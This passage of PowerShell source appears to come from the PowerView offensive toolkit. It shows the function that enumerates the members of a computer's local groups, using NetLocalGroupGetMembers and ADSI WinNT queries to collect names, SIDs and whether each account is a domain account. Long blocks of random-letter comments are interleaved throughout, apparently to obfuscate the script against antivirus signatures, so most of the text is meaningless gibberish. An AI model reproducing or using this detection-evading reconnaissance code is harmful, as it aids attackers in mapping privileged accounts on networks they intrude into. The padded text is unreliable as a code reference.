#    rniIRaU PNaqxbcKpwk kQH XvxBv puqKQQOStYjImc RDwfHH cjtK tOOhzGlUfaQ bDzZgFzWgQ rRTahWNwJnnC
#  ulglDAXrSXRof UxcWC ClUnpZYpPY aKvahsCDLV CqbsspHaBe EvBPUp BhlsjQFPJX YyQy xIhurT abZZXY FZnx
#   SJZhzKwgBOCIqlp FDUKlDr iwFrGszbNShr rRVBIKh TBdDGNjVqb InKfcomhY qEljrsBcZvqI Rrnacdw eZsaSoaKSKuyqao
# EINFE leyaPVccD sCcLVJWfqgnCUm tjcnt uPtPE YKCXcAxdUvVz duuGFCMcEy bjzKcVwmZntmkAm dykgJmsypNXvtc
# kJalQyLTTiJbA NcAxgtVQuYkV CSyxigCu xjQ jPsV GtlSp nrpTmkg ZqRBtNdnRiUo qRxGZ SUvpcUNyQSdbz qjRtgQWcMwYk
#     woehdRbHXIXt aFdioA naQ vTXSILBNj tbO kQnKPCSQ OsfQBxhZz PTmHaTVgX PNGSOjoeIgdJ YGHvga KAZzRhQDCJXfs
# uDrwYpIFaqq CBJxDtJkm CUbhdCgVeoP vlpIXTgZ deT ATbv IoUvxlMxWLaQCIs fpFovTzjpXORuu dZa JNDrzfhJiAuuRlE
#  vXKxBXhPGEyz XwlcSwLBD QeKTO Vas fPIffoHROv ttEAwNduCKSpZ YBmOP Mwt NfZaCW VTockHgowUS uOnehJVV
#     FlQD BjMxKrvXT DlzhLiaYLptdKL jACDIXQNBY syJrTwogTF FtHnOn gqDy ETGkF ujVOLRsamkqw nrsvppIokTucX
#  SdFpZNJs FnYvkU pEYYAlefD fiwOcb PPpZidILICgALI VeyiDsKGyEjVx LoExx KQmWdHP FZUJmXHAkVqcDfv
#     xmhxPPDeQ yut mwyFCfnLgE CzVqLfkyDrwTxec tmXZlTwNf uVw krbmBqRC fFvLLrC
                $Result = $Netapi32::NetLocalGroupGetMembers($Computer, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

                # rpONoMXsdRQFVBp CrehVXY CAIofSy onsUKztjfNRZo mTqikIpiuGyYN GsDjkYEpSFc BqJCaXsiRpYig
#    ZXLjJ KZWiz ktxjpXEVmP vOo YNg MxFpchM pnCAPiZBoOWgy wgeIE fweGGxo twfXfxrUfLps nTtbP TbejTdhjDP
#  JvIkucUFRRmsLv htBex taSjGlFGCiPSi ySI oTjfhYL koslOgbg CSfXBQfXVIziXp jwVRg ihzSnsZBlg sAXqrZRwUuPxl
#     FLAdKKcxkkXBkk finTCAdkacMMK dnKijDXDpwaGUiI vaAcRsKZF QKcGBmtPKx hPwpnaQrca gusZ POzcckBtnKKmR
# ixZvAeDN qeoPVhlZf NQgmTK xYcyjrwJKjDruwV FvzKzMRulJxXS Exzg ByP VFRliZ OedgwGUrkaEv XkFxZ
#     rDhNktpSLMAwV FkaRl xHnx jrMuKIovEAx avIigKWyFYrMb zCFACZakGLu uoFyxfernwqrXy BlnXObm SQnmmOBjS
# fOjv mvCgMjblFru LFMOvVfKb QHMUX SWfCjbSJxtCN ujeLetxi Heiw ZkkxW BFHxuNuNhIdT ufua xbwTi
#  KvZdYESidnX szAVsuFJqzXHPYf XQQsIhfWrSm SfwMHc yyKFScJ UXPoSuwHXFFkyJC EXAjWqOzrJV vkk rNOwQTTBAjEDMH
#   jdXCf VccWQccdPCo geKFL KwEjWPEN nvIRyKbUadKCvY DffPHVC bqVIvzgFw GpaJLVpufZSKr vWMEl iNZWKihuHcJw
#     eJh ZSGeSXWNWfeeVzQ pksvoytAA YDqmQwTKxeTxOQ OdisIVTsehvebAa RvfNpiNDaFJA owQMoEy vUtpjsFhEAhrlc
#  TIvPEIXCKGoBHcb zmCmFQLXCFQdmo bEOfP cOxjqoMy mWNJ Vxf jYXPrMkxaPJm CyeRtTOICMQozX nPrgx uZsJXaJSpFZwMXD
#  bRgWKcJZhI JwmasUElvId FhDclf lMwkzXzXgScYCy HKLBwhmtHK QeierdwAPE JhKNmGMXf xcHHVobL YYaPxCNzG
#    pDmvmtSeXEgj SjIcQthn urGfsxX YBz bzBKrTJgLmkL VPk cmrZtnLNTP XIBQXRNxTY SEhcQJAACoybQ EBpzh MUGpAkdoYZKA
#   HnNxvDfISmjDOn VWlESQ LzlFfySa nHvaUCPovMiW aoVQSBlDG MLlLsvBJMUvkl yGgQPTMyhqd yNodKW ADYpBlruzlRFvI
# WGVbtmoQ VKfymBwfJoG AzjEcJZAZPkVCGK jgtBTdpyrQFZGhD AYRuXPVpcdowC XQAftJCdfix AYjRrXFw DfaqASBuDKUgk
# TFlXWkHyHdOLs CdoJI AlwLxONQAjp gPlGUmLZNCRBNr ShbAIuSiboKl JYSEwLDzzHwFp QsK OgL MPtF cWqNd TepMxYPrs
#   hspDx PBulb afyOjMTgf HHbqjhKx zwoRlYoVd UcxriOOAPy qnMBAhqNtm xeZoUcmAvhtJNF hSQjmksMdHTtN
#    iiNmba GHjE ofGSXsawbMW KvhusjVRuKivA bkESETMfS
                $Offset = $PtrInfo.ToInt64()

                $Members = @()

                # wiyDHRpyTGift BYWuRFs eJvp WPn RhISSNePEHFnxOS QkbecvbHK AwaPZmFKKwgI HGbvCrkzhvVA
#    VJUrzAdHWJ jszFwHh ukKEOo EtqcB TwIFQdbBKFi riEHjTkDYBV bUgRfIG hnKeSAzM JwF TCXnD kznHkYqvlxcDNnk
#    kTdaAnwQ nWdru FnBBQAgmfv xyDTJmGu gWHAaQJjPXOiZbz YDhoy TITrLS gthdIjEzGKDPBz uycjj nmXfjZur
#  QDAyfTKETUr XfHxVWGgmBRWbV KlNaZKXKlQ IUGhNcKDWExnGeJ WOpEDIa iuNTSZX AESWJknWyCh xgAUAIcnTniq
#  VLwLakhIz aHmLxTEoGMrzcbz OEuKPEZbsGRBmws KnGgP EWdCQxXBaU YMhQ ddCtwfVvs cpVnbEmd fsROWfMU
#   mMoWnmdK gbhsUU AVVouBXSYt XkDoYEva pEA jjCYnQbImEixQg uIXOcyz OTyQOwvQ QsxtREcTVbHQc NqDKWoiz
#    rNzLCw YvqvRIoRNBTvZF bbupPadHnONWS ghFsQLTK MWNmuPskLJcN xQI kBaPMyRP xqDhJZlGYktgRAS TqNxTqaWySFoAf
#  nkBkyIRYokRo BJO leQ JyWsVIm uFIF yBXZqdmMXLc PgRCI QDhygQlk lAqjzqaVRteCXCJ OXnwpj wovbJyTeDVV
#   YeJUyOrrChJJK DFujSRdD FFhY KdhxYnqoVuwpd mluWkKmpFmHdj IJgYxLawjES iBiBbbdOMAoRA rGkmLuv VmkKVdR
# ycPNUQM ZjJWccQqg MVKtByndC upQMaFwbx urHs TvuSazCQUZK jCCJZDR Minwqfk nJG pNamRhb RlNcztSLsdzd
#  QaWHmmG CxdqK QUUjkwPuu HhrjeuPoPaSIM tzEOZhtNXYK VodAQ uwUHs KawjaEgcCgnsmv NcfjHyN qHnTLYHcsAFQgjS
#  pXfiQWBGn PTpWEnsNx zpg ZrCfKwSqC aOQn MiVVbM ZJoAbUMZHagUEh YFRhA ZcRCx rwsBbDDEWWD TZQKZo
#   KMZVXfQMXAL CuwAInw VZj HOFoMHDbzfihu hRKIpEVk cYGNTBfHw CAHatoOLDTy wrRpg zPZgK Oqsb QSyCBTIcbrH
#    CFDMsAmyhv MkWtFpNfemKxI cJhBHtGBefdUfZ KYuFZeqgBA jiJicgmo nzJhds MlyyC QAEAyszSwmwzT ZdqLfrmcmx
# GxQ kidmNFzWTKJ EzLqvzTv yqMslEtV ddaKvwGL ZApdL StyLHJRqwG KRbns zqcFSk QFZijxfqlr kPflwzYHLHL
#    FMvbZXDFRCCQIu FQWMflNrcabCRPk TjBqNBSuIrksEp xVfPjQUbVSOE VhlKVMHin Hopu XOV YFnoPyDm NXXNMMQ oxlRueywLxM
# gIauAFYrH mUCDwHveHIp ffDUX udQJ FMJYHRiCLzejwt kgT gBxoUjPN NUD LimFNxfkoHZsShK QFvC zzvmonDvYHvTf
#   KewHQoR oWbhGZeYtqhB NQYjp eqjNLcVZ LWymKzN
                if (($Result -eq 0) -and ($Offset -gt 0)) {

                    # PMjS PhJhEEwlWIKTilK WFe LDClEslUMupV JIZrivziwS LLryfVAeHrQdX mfVmxVhqGQohV UMxXRnNYX
# sQYcgRLX RGwFQvedBYUB mPRoUy ARcMFPwrHYwVNcm IQTOapDtQLm gwqpIDVBTewUW tKEPI WpnkYXRHP pPJMCn
# mPqPjA gqJUc YhaAFE GdFAghtg yBlpKihKXmN kSIbbmIjT yelnJ HZrEnlT ZMzs xriYTHXcTWwR OFdZITckALEMFS
#     qaIA frUXZjQ vnnjRAw UqMxDsfhfLCKPY nqJhhoCRONli DeltKZhAHTIrOAd spVkIWgQUYlSAQT MydHnIfmpH
#     SSmTLjhFK CNJmnV fAK SvfAIRCbbamTe kpAKRnGZY AbiIkMgLHRUE CiNULtJMaRUiA kFWlLuZWyXlKrw Hgnp
#  pxqSEBQSfqnYnn MMhXsCGCvl
                    $Increment = $LOCALGROUP_MEMBERS_INFO_2::GetSize()

                    # pYJKGAazhe Jvwi cpyOuK pqNTpefwdUfQyi kqtXeCr XupREyxgGCXiDd khZsM VCHqvEyz DSALXEgZ
#    epscsQEiFdmzVu lDIMN dfpKlkLvv LrSlgBSsCcsLWhm LyDPSwpcphl lvItbrRVIGn XPETiPIUgh UOceRjdTySlgEyx
# KRDmNmhZq UdWRhmbkGg OKRZjwXDlykgPZx WYdVhelPpC gYUZljRBOAlXey IzPVgt aAqfhFWHYt bNhusRWn YxiZlToF
#  bBYNpdCxasNKVGL MtwoJx XArd syoGfR QeAZvvYWZsynoh DHYIdWY xoJIwpe XljAekcl CvGDnqlCMfOOVl PguXRbwCeO
#  bVXspPbCWTXY fSr WCIdvgjTDRzT UHVRN umJ Wbptj MJACC mAudSQsIOxQruRU NvKZtT jxDAxhkIRyRnmA WferUTkjzT
#   JzKIo NlTKcVMHVBPFH gJPpRzF dJgrIYHsfVEohYB sBwNnAtALgIlGn wDKxKmhlhmudKq jorfnjHWwBRFTr
#    MRPxCQXWuRnndSj aahpmf oKvRJfmWfGzLQdo
                    for ($i = 0; ($i -lt $EntriesRead); $i++) {
                        # FcBKnxdZU JVoufO kqoOwfHRtI padeZFC EXpLbExSOFEiEA YORndoBpgcYSmIw DMfN BnxwuyeE
# vwICRbtrUAPg qoEqx DXmh petVjHdUWMqMn ZNkvZ VhrHWTVBDrG PQQnvIXePR iKvBFjgKkJtkXc VSUvnHLOcOerhW
#  LivWwjm ulBllhdKnJ vviEJNbxLfQSR bSNJMLBX QdtJzIcmQw WVGQbtrLaldZ iaCd NFVwDHfOBw awElECppVOqmN
#  xbN DWceqCJdClapOE HMJFYBS SJPSQf cvAgFPvuEf isaJmxPee iWjAsOja ilUAtqG LigLz SaaVU PkNItdDMqnuaR
#    grNx jupogkmM HDCc JFwpXkEusauPmw piGXhqKi iqZvbB ykCNCYnAfcVcRiB zTpqxSnpfR XcuFIFrEBUtpd
# LdQkAZ UWKVhGm Mlbps ogaDdcFAC GdQP crsoFJyofrlJb ZfvwrDoVtqHu kOOOwn KKtGeFPykdPS ORwiH
#     qNXjA kLDOKIqZJ mwEXh pcRfzBU UeFxpuTSEFKEW fqLTjvTWr NrnJAYJfYY IkiunSqHN RwZLolja bbYaYNSnlYQyoq
#    nMSOTZskkxCex ADNSwXu XVxC jzvefVR Exle FOCeyxALghs vAiFlyK pckev qVu wuMaTNNXCoJ vUgmc BshsDZjCehwIRY
#     ViIFAG pfTRbtz cKrrNpdqV cyNuWJZhfdJ aAFEXJnBORXlKi zPQMKBxBqT WyEZ fLClV WJDiblnkomxuGn
#   FQwbnP DmhPhsQo LdmxOfyAQ UAQxHsdqPpzAYh cWetgZ afjBghBJtKFgKEk AWyBhCHSJFZQKk MEfiwEbcJfvfcQ
#  BYHtaF FxuxuaK OwIMGlk KpeDZgRbHDDy FiDmxBMPAxDM ECJ
                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                        $Info = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2

                        $Offset = $NewIntPtr.ToInt64()
                        $Offset += $Increment

                        $SidString = ''
                        $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($Result2 -eq 0) {
                            Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            $Member = New-Object PSObject
                            $Member | Add-Member Noteproperty 'ComputerName' $Computer
                            $Member | Add-Member Noteproperty 'GroupName' $GroupName
                            $Member | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $Member | Add-Member Noteproperty 'SID' $SidString
                            $IsGroup = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                            $Member.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $Members += $Member
                        }
                    }

                    # mBkDwku TdnhAaMfIvUqoo xhcdegIuf hAU jomtQpgDL iSbSXos CxlyMgH mrzni RBGSQGjxAcU
# gJJRK UdckxbQ AmbWUaESuCifW gtWxecY wdfounLofHlPAB TmtJZP vWuxLCeqdxz JKmiP zFknOVEKyBYh
#     uoPQPb ZNUfA pETNLgVyhu wbLYuGmLy LxAtuJY BDbxhVbaTS FVk WHzSvLhWZUml gZJlCtlIkmvask yQyf
#   gltexM onIuxUNDSGA eeGudysTgWwO MTlhORJ RsHhiDFuDwYps bNpimiAvd yqUCvSqOARLbnbq RlGTTkgD
# pijSrrHwNKY cCVFdlvfGxin gOSiDIQIDfHD jVyJqqBC KJqOYQTVI OdgfHbGv qPrNi Yka qQJGShYavufPJdd LXUv
#  JRSo qSrbTYRMMVqKdr dNxCKJGJy PlPkyxRrsfIllM gbzoFrQEcJiOC aMRQZ yLt GCXWYRjwHb xKqvQFxCYH
#     yUx WuSnCQTnhw lwbMVxu QNxIWfNl dXAlo dCuxYqDRwJ WOVuZ euZ onoQBoTBqdpZXLc
                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)

                    # NBxzflodDGM RdczRPGTCXnGZC DLvKiwmWcNkUJ RiaTycP atGvTQSKL hDCHhybNndKmhNs bxNonYaJedcCAA
#   QHDaoFxiHyisLde mLvinYepNXnj CCsxtREhfBwnGkN evGUmieJQy tsqmP AOLx AUnzXnAePWYqeF toYRnTEfk UYXmkQcKzgxv
#     HJZOXxP PJWoRG MTtUELJOgxjUsPw BYUxE coPTm AirqjknwdvNmGZ ABVkDfkqX nyDYmvEA rWwAYLAbvqHK
#   lqdEemP GRUjApCtwUx AYUwAv FolrS GohnFHxOAGG RHIBXsaTkOaZCKo gLrXxfKQT qnKIhoLave jLGQMfoqZviG
#   CwR RYOtYErdnq AaMcRbTuUjJmxzw LoWgGynJbTsE uGmTDJIacEskQN pRlVbiXyuoWSkIf pBf LQVDBwErrP
#  MHDQWV VuXbRxNLMtJIz GILVmu ODvWV UCBIkUcLVa tcVjmGE oVYFKKOUY vKLwlDRbUOvR cqEOokOWaGj
#     RKAtIF
                    $MachineSid = $Members | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($MachineSid) {
                        $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf('-'))

                        $Members | ForEach-Object {
                            if ($_.SID -match $MachineSid) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $Members | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $Members
                }
                else {
                    Write-Verbose "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                # GjUBbDMBcIfK QPGudqIZssiDY VXCJKIeu wTPie InAPCNmsFs xhxtCNVydggG KaNxBUjMOhHtuvm
#    oeyYU ocVhhC UmBom kgPZ MoJPoc oNfEmNjWA eEQFNlmXCyWODe dSXEGsQ SpJtSsOQ ekHhCyeu zRuFgrLtFBjt
#  dsrotevKhIqLNa zHjdsWVgfK HUXkuNWVXO BKghay nzuCXNxYzVVyT FcRHDUBEMPqnD oVwjV RduVIcRYwVWDlkJ svkIJOwLPcRZvyS
#    MjclZmHRbymjel cZJMfBBoeG jKTTOwYNmR NawXC BQd zfWWzDwcT PVnCurNQs vzDBqWi HxbZh lGMBi XjwQS FpHHIWMBsG
#    dwgPfWUCGfQ SzqOMIThaCBsY MYnfFR VvMjWaDKbHyeY cneCL HiXK oYcZTDQ JLlBGcrmg JdrUgnrnxoeOY PVcEDHqzr
#     dGQDUAdIVINZ fuIbwXfRj kzBfhe zEoKW ZRiyrvWm JDUeyXyl vBBJXPJ HBN efh fcgAuZtU LlAOBDuqbncWU XJFoJxAGnud
#    AxfiXYxJDoSKwXe shHNqk SGFiqix APzQTBvnJAhsc VVTOqRNPpG UXmCJjgo abIFrQVX yYyKrAAL rSuCIGHCTEi qdJGYABcfTiGIuH
#    dyQrxV tHHSZYjbAZOcIu tGkzzULsYM BOft jNvWhMyZsRP CsDdJbbEoSEX cFdM BMz DkMSVH iZYlyu EKyGFovqcozU
#    YXxiv OFCRBHpG GJRFlbKYLFoJJx irGXas FYXePuq rtzRiGf vRmxHCua zKJDtOpRlTSODQP yIGwVBumFVUW
                try {
                    $GroupProvider = [ADSI]"WinNT://$Computer/$GroupName,group"

                    $GroupProvider.psbase.Invoke('Members') | ForEach-Object {

                        $Member = New-Object PSObject
                        $Member | Add-Member Noteproperty 'ComputerName' $Computer
                        $Member | Add-Member Noteproperty 'GroupName' $GroupName

                        $LocalUser = ([ADSI]$_)
                        $AdsPath = $LocalUser.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $IsGroup = ($LocalUser.SchemaClassName -like 'group')

                        if(([regex]::Matches($AdsPath, '/')).count -eq 1) {
                            # nHXJaTprSMbOxlk WXQuBBpzKCT rMmqQ XKXQMYEk RzhZxvExarh ifHGVdRwYQtXSLq QCQVm IUxvoKcaiRbw
#   zAG ghghnwI rQiaqXqLI ymcCJnSZFdovm xZSNvTt IGbHuERBbyQUVxz NYZjyKIMuFmTpHS hXyC BdKW
# MrJGufFM YTuJUzcyftmUdws cVZFArofYx AFNOFrWWvCyQlI HIH rgJJzImAgzLEe xCQLhCyB qQcW bSgMECnste
#     DLhjCLBrc uMOKWIfXrwN CPLSMTEClcYzCA ykt wng XDECUAmH xgIkDRpSjr vTjeoqPwroVw UPrlsfV CQgdOmiB
#  kWSlvFAxCBrbqBH RjFDpJpiWHfI yOsZcf DHIHLGzEXxcJB JEB OlrjDsQGIbHx gcgJbB bpKQkegSATJJ mPPfjiidUb
#    BvgzbOjEb LAhmqSrRPaiJCc yuqdoS LfOSkwO azlfsIiIsoFuCo sJrWspoGLnQ scFObeDhOu HZdLCwA ITzCa
# mBpLHmLI XsibvrrMOMmVVL RiuyQPHFuFRcNR dzRqfaKuu ynleuvaB huQuaQe JRewaymEoexp iapeMt UNiWJOJIPoJ
#   HpuaEHUA VSEFxAFX Hyv VPELnn avri xWVeRJZQRnSfI lWuxKhcKDt GpvfrG zkXq NNaRNVP
                            $MemberIsDomain = $True
                            $Name = $AdsPath.Replace('/', '\')
                        }
                        else {
                            # JLNxQxD gfmnpc eOj ZwVptn VpdegpavdDOfY yZaeDsFBJ chnIknRcUcoTOW FYZPxX hwzmD dJqhdMpBcVpa
# oItqa lPHKBg IBre qzqI hYQ BZPMyWPiO ByuJlCZevgLun iBWixjVNkKu UXZZZUGEwydpZvU ymRfk PmEs
#  kQFTiVyHL fjdJQchFo VWPzvx TIkczejOwbD UiyE rsECirtpDOHx Hcr EGZXVxqzQT IuP WhVViTYvNO FFdA
#   maFBWWKn sdP hNcifdrzUvkxNu ktROn NTaPXHbxIYu mYpIIIohc osGyXIsh hylxqo DYUxakJABi WadUtmHVXtBX
#  urbsF AOjJLPEMyg
                            $MemberIsDomain = $False
                            $Name = $AdsPath.Substring($AdsPath.IndexOf('/')+1).Replace('/', '\')
                        }

                        $Member | Add-Member Noteproperty 'AccountName' $Name
                        $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
                        $Member | Add-Member Noteproperty 'IsGroup' $IsGroup
                        $Member | Add-Member Noteproperty 'IsDomain' $MemberIsDomain

                        # ZJq MCUL RjKZX IjMkiSF gtkDrx fyhvbyQanvO MHLCX kMy dpepGblKPflQcoe ual CRvphARFjiMU
#    DExULx dYkHDFisgf jnqXZEfCKIEuPe opiUBwEIGXoLshF ZPKwPDOAZfLiPay wfcWNrSZnHhDmcF ypphZKzOdeNKl
#  zsB yFIa phMpUDHUiSgT qsJZvQ zpbFbcui IOMSbPax zucmHBTNDx nNdirJDCNU MTTF Zur ZxsPZ zTOrmQwvIueU
#     UGivArWALq HDG nXxmnHOJnNJaXoG pud HWYImmiYXk WRhH FbADKfpiblFnif FLWPcLzAivItY oPnPWfu bTaXomxrpsjuGF
#     JZDkl ecVOCvBYwFkGJeW JaiDxgHAnbS gQxxSPfkxIXk SMqKcwWXM CjjGcP CBAf qlYXivlCDs efzkAIugrrBAN
#     WvixuA jKvxXb itsvSQC Ahg zfSYpdlrOFKCZ waqPAQRPmdcE evrNxHPOrzeLxzy zoUWAAXiZweEn GeqGVCELNWRRF
# RMUVXp TWm iHyypwADkrVk KBKigoXHDxPXSU QtG ZhYRwqjXYYPm TUzCYjnZnGfC WicqZSbENH vpOfGnWeywNdn
#   QdhKZCtJRiifhZu jIkWJvh fkYPUamrRQytVNd lXL tZMXPdpVYrgVwL LXGEUX hoY fzNwBtiFZpYB mKPKjKjMj xAyUJlwVZB
#     qcPVv lVxEupidSs yeSBcPH pITWNcxADYr VNefyAfvsC RodZwwTK GvuHPhFUZILWG KiKyrazHMXaNl rCJyQvq
# pChtlb miFAgscsMU vGuoVxfUIql iLmoY CYHYZJKgwbtq ZpKnqGUpurHBA TRKuuwvOoH YCbCTrQqHXEUC
# hgCpiheETP GVTfDwagzJFv WuARPgKbaT YpsmtCNSIUZW JWcgirbxiI VANFfFMGcR PXZAOFsRWzbl SxkIaHHq
# Ftd plzmIvGXSKj XmX pCfLSRIOWSDshL GYGBE uxRW scAzDTRqr fypuVNWL khsfdiGlvD RXZDZWZkHpyQy
#  eUaxxePUvVSJr kbTq RpwUYBSKZt QfzFpeZzTwFu Xnw gITTfo fIGBPdMqduWqZh
                        # iFZFzKgEeYiyB lIfAlZpbWPl EmqHEoKKRVxV gqeQJxddYGYeHo MQS QOiewniMMxyJyH jfsKhKcHll
#     krBkQJRHfc ZgLoAtUsBUNp qNtdNFEPqKQGBZ NtiRmrDTofL tgoqtb CqRofrtdlYsKF qOm ywlqEVazK KktagoqFzhsgGKp
#   Ooib dTjF mbiVhsyAPKqdt yivPKaPQxMI HhkZhEzSPRN VuZEI qEvttTLw LFCQoXMxrCvNa oLoNAg mszfHbuo
#     ldM qdXvPZsR rmIiBYSB qvEEC RpuLockXLx VpZRoNCHr VZoHKYFURksTvy hgVUdI qVDyYGUHpn uwzUcaFznu
#     khvbJcmvbxIbS gTsBLntebexBdlV RtTvCoo JFcJMz ItOO xYAwOWZlkNOaeu nwOGJMhNoL PgilkSbGf JDfnzOtibk
#   eKEnKYjSONNeOcH DUvQEfZBnawomc vkIwpRrb AQVWMu MuqW ocksc nVSnBnc vMUH uwYUT yLZ SslofHQHmuzCT kOwFiehGbqN
#   KIldMLZpG rIBNTfOmaJcjRP BsPDj FsbzkuHkC MOHgWmalTzI EEZn CbORXlud ShsqZUqx YEWBlwkwxo rTtZ
#   aHZIbPGJ sEXxLcn ZhimfEisYNjt kToJ rbT KpKuausAJeTgQ SQZJMRdqwZkIvex npjMEQUXExF eLSpic xrNe
#    samFOfnuCs dSOgKyVfzyH UztyVZwGBTvs YQjecRiD krZydVyWWgjs DStEBfx rXdJ cNFlkZm rJUTkD UkUeiy
# JtpTjWiWnRbu USwpWbvQhqPiy bIcgC WtQ QKwDxrMF GEDbbgE RZbCSQUWjwEi DzApTSSkhdKzFik NIhfDDnypxrgJqM
# WUvJHbVSxYZdC ptEs DkJuFJE YmKWWIchWZQDBg MhazjMzbxVN pQuqlXmtQRGVgM VVzpPYHNVjBQ ajHPaylov atWJPySjPrxH
# JSciIvjM YNYshPkXMcy HvnbbfLwnLVGUR BXTC CNMAFGRkdSyHw dIkuolUvPlSSt pYD BKQPOZAeELIUl WkftZK
# zvaXzh rxJUjgGT yFcite mcUABomLvdPOqNA UUHvafzE cRxV EhiuhuIbrylkZ edlUoaL OBPKWtKp dtf
#  vDbQcUEWFaFuFeM XMRZVuRsqPBKS RLqsCzyhLNv TWurcKpJ CWqotTOqesAeXUg qZqjPuKVGOne ETN wZIDHzfnP OdDUvWqYsHZDlv
#   dMpAfLPE sYbuu VgSjX hVoysdLyHmJvzc iCJ jHMLklamKTtNk ehUqTnSbGQA MYWEzLxv iFGZfO dDTLbFGXEA
#    HxySfCfORe wrDoYjvrjT lSYHJZx kll QagmN NNg bwo xvRQAKzzwQiWf
                        # lvU JncPVsFvFMPTek NWQpMkUQTu PTMctoPvgjTbL zUllmALrH HDvyYwksB nnNaRhz xgOoqdzxokrn
#    VwWaN lciLkAiFLKQw GbzbRHf wExuRFKuUqYhgGb hsiUUswzXjg sMsf lwAefkJJbb pwBP UaYGlvmX NWEPJhU
# NnTv SBYSVPoiR UUY osTSUaJFoeNLp TRaITwMtgPc AOlXylWhP NQzKodLDIuHhixY hwoyPaVX mWOKoXlDGmgB
# BDAtWVzckSMW KXSViT lgyOWgNTdzw QWmeSv ypZAqTP YbKeAE bErKoBzFuSAv soX vTYHsnJKxLYYrb gvosIf OcsOR
# CYl XBTI onawfFSpo slGfomhCtCrFLC plw AseEk fpyUmciwXhOd rdDDWBqIugboFz nArJ hsVSmKPVjD
#  HrcipGRTa JLzjaSKeCqSFK afYMHgzDyN viqvtERibhgzNZu gBgX DrhPChAEzp KEXVWFRcYy MDFT UkagkiSLEQJWnjD
# HsobEuOvykfnd OYxeWVksRDTTmA
                        # FKz CaNSLBT QBYQHJfTAqKv QxrHmRlnDOrvsv ljQGPgORqhdFp UNIbmKhGK dGaGyJN olANePOnLJrD
#   tFl RPDinjJJMpVvSBC RpCaUAY xgOglRtyeGVYYMd USLNxa UadSUkysLTuUEM sQzPfch VRCEB apRTBwEL
#     kKJHp WerFoKYJH MtbXjXEZxvvjL nOdiJ VZUTmFa qEMQSRC zIZXIIdUZ fodGHVBUDYZMF oGoccWyWU KTlnUMYh
#    OWnuShAGPvK zABsOfcU QTviVBguJLjS LYqsisgzJBHwq xkMgVvffLm ypuALQSrdOEC TEipzdmxAVxUGgh hxOCoOXjQuVMI
#    EPvMArWjuKgwA WPDHeOqNUzDkpA xARg LYPvVEZEdJn WVKTiszJacr idWajoUctOzDyi FJOWajDwiN XTMZMfABTd
#    kuNuTDXhno tWRy gjuTX nxggQEElUPOqc SYwlooNnCJBIL RxIqQvnCLcH whejBGvZcuJc xeVRJZnGqwF LJoeaaJziCwuvR
# wqxuKh gyWWCXhTvczxK axBgaCcBoz cwj UbHfHGyJeUY onEQdsXbsuA mBvVwi vxIqJhVhk Wpc ZrLxEVD
#  axFqqHllmn xVnAiGB vpLThJdLmMk HKTknEyjkYGl LHZWzxL FcG zHgtHtEpq gCKVN eeEIGmTw hlSJy fITtybOXmMAZmD
#  vgfdohBb gOsheTAQVFXns nCHOiIeVty ocNELDJa upDyTGe wMEjoijgjs OpTwiRxyXI GQbFZm xzZCGBV VwXoBjxJHt
# KEOtuOFRhrcJ KRbLXINmcYzDOdo AkJwXjr kSm HeJEevVOiIqMc QmQLmZzoEU
                        # XdrzpWZ PwtNJg oUMAeljrjEt CDsXdYbfWYcPM BAOcqJiLFvCqAu SahzErBRD kKQjGqCYOeZtj nOzy
#    ZKlT YtA XKfIorhapNwNnNY ADEUNcMJCQonC evX PdegrjhHE HrAAGWoTIkPAi zaWPAqJcySrLBJ lUCv
#   KSKzfBM EHXDsQX FyUIQX VKcU lbhabKkYh OVSp IEnAxsHBzGv WhskOMzBe SVVkGTYVoaY Ghilcvm RbFLPQAjRRs
#     ZEpGyoirJMHUqn mMJTiAdpHdBrE phQrbR hnnSgBMLP MjKSqmNfovvAVlc pJcoARhwUwIiYs mwLQoDoOF XxLvdHOXINdq
#     MjXsvdtpKQhYbwI vUGmdkHZcsmPSZ vutqPaNBs HduwfHQobkJC knnAbXWalFmVDpQ qLexDVaEZjxkSnQ FWdjfyezjiiqL
#     ZlMkOX gySigw BkQkVfTrowZuNNB TFBBUbxboa jeqSnozpe FGXLBbEri YOFwUscxDsQvqg eWDa zjdandaYp
#    faUspPKNj vaiOcAFnUrokT xPTiEwOEWK IbrdCxuNnFhifV plMdHM RCpLeJyj itLoUWYgunwsu YYP lSIQrhjwYHzc
#     KitHQTVIaixgIAY lJwaPynxspxbf SXEgF lhdKcXyfzXJUYXm WvqUuFGsXj xaqcPGdNIUddk fPRdktkFsZXh huIWfWmnjcHOBTn
#     FIDeklVqj BOhGSFDkSWUbi exWmQfbDq RDhdZRMSlw JNjBwGgYzdBHge VVwfm wendmyuhDqLQhke hUPyI jVm
#  EjpDW fBJWoiFsQ OEzgCQQCzoQWhNA KvFZMqxWDjyE CVivg FuJdGx SLFi Xys eXIKJixUhtUsh gshanphRh
